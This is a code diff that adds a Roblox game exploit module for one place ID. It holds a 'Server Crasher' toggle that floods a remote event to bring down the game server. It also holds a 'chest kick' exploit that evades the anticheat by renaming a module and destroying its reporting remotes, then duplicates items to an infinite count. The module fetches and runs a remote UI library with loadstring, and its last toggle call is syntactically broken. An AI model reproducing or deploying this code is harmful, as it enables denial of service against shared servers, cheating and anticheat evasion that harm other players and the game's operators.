@@ -817,4 +817,119 @@ if game.PlaceId == 92551591080135 then
 end
 
 
+if game.PlaceId == 136169205786617 then
+    _G.NotGames2 = false
+     local MTab = Window:CreateTab("main", "compass")
+     MTab:CreateToggle({
+        Name = "Server Crasher",
+        CurrentValue = false,
+        Flag = "scrashcer",
 
+        Callback = function(value)
+            game:GetService('NetworkClient'):SetOutgoingKBPSLimit(0) 
+            local gc = game:GetService('ReplicatedStorage').VisualRemotes.GetChunk
+            for _, c in getconnections(gc.OnClientEvent) do 
+                pcall(function() c:Disable() end) 
+                pcall(function() c:Disconnect() end) 
+            end
+            print('Started')
+            for x = 0.001, 1, 0.001 do   
+                for y = 0.00001, 1, 0.00001 do  
+                    gc:FireServer(x, y)
+                end
+                task.wait()
+            end
+            print('End')
+        end
+    })
+
+        MTab:CreateToggle({
+        Name = "chest kick vulnerability",
+        CurrentValue = false,
+        Flag = "scrashcer",
+
+        Callback = function(value)
+            local rs = game:GetService('ReplicatedStorage')
+            local hs = game:GetService('HttpService')
+            local sg = game:GetService('StarterGui')
+            local lp = game:GetService('Players').LocalPlayer
+            local chr = lp.Character
+            local hum = chr:FindFirstChildOfClass('Humanoid')
+            local ii = rs.AssetsMod.ItemInfo
+            local abb = rs.GameRemotes.AcceptBreakBlock
+            local mi = rs.GameRemotes.MoveItem
+            local blocks = workspace.Blocks
+            local anticheatDisabled = false
+            local espEnabled = false
+            local IBM = false
+
+            local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua'))()
+            local Window = Library.CreateLib('Chest kick exploit', 'DarkTheme')
+            local Tab = Window:NewTab('Main')
+            local Section = Tab:NewSection('Make sure to reset or die other way before doing exploit')
+
+            local function createESP(adornee)
+                local a = Instance.new("BoxHandleAdornment")
+                a.Parent = adornee
+                a.Adornee = adornee
+                a.AlwaysOnTop = true
+                a.ZIndex = 0
+                a.Size = adornee.Size
+                a.Transparency = 0.5
+            end
+
+            blocks.DescendantAdded:Connect(function(v)
+                if v.Name == 'Chest' and espEnabled then
+                    createESP(v)
+                end
+            end)
+
+            conn = hum.Died:Connect(function()
+                ii.Name = 'ItemInf0' --rename it so anticheat cant find this module
+            end)
+
+            lp.CharacterAdded:Connect(function(char)
+                chr = char
+                conn:Disconnect()
+                hum = chr:WaitForChild('Humanoid')
+                conn = hum.Died:Connect(function()
+                    ii.Name = 'ItemInf0'
+                end)
+                wait(3)
+                ii.Name = 'ItemInfo' --rename it back so other scripts can find it
+                anticheatDisabled = true
+            end)
+
+            rs.clientUpdater:Destroy() --Destroy 2 remotes that anticheat uses to report exploiting to a server(clientUpdater and clientUpdater2 :FireServer() are wrapped in a pcall, and although these remotes probably dont work, we’ll destroy them just to be safe)
+            rs.clientUpdater2:Destroy()
+            rs.GameRemotes.Demo:Destroy() --Destroy damaging remote so you don't take damage from falling(but do from players)
+
+            Section:NewButton('Reset', 'To disable anticheat', function()
+                hum.Health = 0
+            end)
+
+            Section:NewButton('Do the exploit', 'Put any 2 items into top-left corner of chest', function()
+                if anticheatDisabled then
+                    if hs:JSONDecode(chr.Inventory.Slot36.Value).count < 2 or hs:JSONDecode(chr.Inventory.Slot37.Value).count > 0 then
+                        sg:SetCore('SendNotification',{
+                            Title = 'Arrange chest items',
+                            Text = 'Put any 2 items into top-left corner of chest and make an empty space in next right slot',
+                            Icon = 'rbxassetid://14529775287'
+                        })
+                    else
+                        mi:InvokeServer(36, 37, true, -math.huge) --make count=inf in slot 36(main thing)
+                    end
+                else
+                    sg:SetCore('SendNotification',{
+                        Title = 'Anticheat is still enabled',
+                        Text = 'Click reset or die some other way',
+                        Icon = 'rbxassetid://14529775287'
+                    })
+                end
+            end)
+
+            Section:NewToggle("ESP Chests", "Find chests for exploit", function(state))
+        end
+    })
+
+end
